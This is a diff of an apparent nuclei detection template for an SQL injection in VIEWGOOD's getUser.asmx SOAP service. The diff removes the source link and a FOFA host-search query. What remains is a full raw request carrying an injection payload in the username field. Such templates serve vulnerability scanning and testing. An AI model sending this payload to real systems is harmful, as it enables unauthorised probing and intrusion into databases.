@@ -3,12 +3,8 @@ info:
   name: VIEWGOOD-getUser-sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gtggi3gx3lpwzxi7'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gtggi3gx3lpwzxi7
-    fofa: body="VIEWGOOD/pc"
 http:
 - raw:
   - "POST /VIEWGOOD/Admin/getUser.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\nContent-Type: text/xml;charset=UTF-8\nContent-Length: 755\nSOAPAction: \"http://tempuri.org/CheckUser\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n <soap:Body>\n  <CheckUser xmlns=\"http://tempuri.org/\">\n   <username>111' and 1=2 --+</username>\n   <password>2</password>\n  </CheckUser>\n </soap:Body>\n</soap:Envelope>"
